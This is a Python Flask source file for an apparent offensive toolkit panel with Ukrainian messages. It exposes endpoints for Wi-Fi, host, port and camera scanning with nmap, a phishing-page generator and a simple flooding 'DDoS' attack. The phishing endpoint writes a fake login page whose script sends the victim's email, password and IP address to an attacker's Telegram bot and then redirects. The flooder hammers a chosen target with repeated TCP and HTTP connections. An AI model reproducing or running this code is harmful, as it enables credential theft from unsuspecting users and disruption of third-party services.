from flask import Flask, render_template_string, request, jsonify
from flask_cors import CORS
import subprocess
import os
import socket
import threading
import time

app = Flask(__name__)
CORS(app)

@app.route('/')
def index():
    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/api/wifi')
def wifi_scan():
    try:
        result = subprocess.check_output(['nmcli', 'dev', 'wifi', 'list'], stderr=subprocess.DEVNULL, text=True)
        return jsonify({'result': result[:500]})
    except:
        try:
            result = subprocess.check_output(['iwlist', 'wlan0', 'scan'], stderr=subprocess.DEVNULL, text=True)
            return jsonify({'result': result[:500]})
        except:
            return jsonify({'error': 'Не вдалося сканувати Wi-Fi'})

@app.route('/api/ip')
def ip_scan():
    network = request.args.get('network', '192.168.1.0/24')
    try:
        result = subprocess.check_output(['nmap', '-sn', network], stderr=subprocess.DEVNULL, text=True)
        return jsonify({'result': result[:500]})
    except:
        return jsonify({'error': 'nmap не встановлено'})

@app.route('/api/ports')
def port_scan():
    ip = request.args.get('ip', '127.0.0.1')
    ports = request.args.get('ports', '80,443,22,8080')
    try:
        result = subprocess.check_output(['nmap', '-p', ports, ip], stderr=subprocess.DEVNULL, text=True)
        return jsonify({'result': result[:500]})
    except:
        return jsonify({'error': 'nmap не встановлено'})

@app.route('/api/cameras')
def scan_cameras():
    network = request.args.get('network', '192.168.1.0/24')
    try:
        result = subprocess.check_output(['nmap', '-p', '80,554,8080', network, '--open'], stderr=subprocess.DEVNULL, text=True)
        return jsonify({'result': result[:500]})
    except:
        return jsonify({'error': 'Помилка сканування камер'})

@app.route('/api/phishing')
def create_phishing():
    url = request.args.get('url', 'https://google.com')
    token = request.args.get('token', '')
    chat = request.args.get('chat', '')
    
    if not token or not chat:
        return jsonify({'error': 'Введіть token та chat_id'})
    
    html = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Вхід</title>
<style>
body{background:#0b0f19;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#111927;padding:40px;border-radius:16px;border:1px solid #2a3a4a;width:350px}
input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #2a3a4a;background:#0d1421;color:#fff}
button{width:100%;padding:14px;background:#00ffcc;color:#000;border:none;border-radius:8px;cursor:pointer}
</style>
</head>
<body>
<div class="box">
<h1>🔐 Вхід</h1>
<input type="text" id="email" placeholder="Email">
<input type="password" id="pass" placeholder="Пароль">
<button onclick="send()">Увійти</button>
</div>
<script>
const TOKEN = '''' + token + '''';
const CHAT = '''' + chat + '''';
async function send(){
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(!email||!pass) return;
    const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip);
    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage?chat_id='+CHAT+'&text=🔑 '+email+':'+pass+' IP:'+ip);
    alert('Вхід виконано!');
    window.location.href='''' + url + '''';
}
</script>
</body>
</html>'''
    
    with open('phishing.html', 'w', encoding='utf-8') as f:
        f.write(html)
    return jsonify({'result': '✅ phishing.html створено'})

@app.route('/api/ddos')
def ddos():
    target = request.args.get('target', '')
    port = int(request.args.get('port', 80))
    count = int(request.args.get('count', 100))
    
    if not target:
        return jsonify({'error': 'Вкажіть ціль'})
    
    def attack():
        for i in range(min(count, 200)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                sock.close()
            except:
                pass
            time.sleep(0.01)
    
    threading.Thread(target=attack, daemon=True).start()
    return jsonify({'result': '✅ DDoS атаку запущено'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
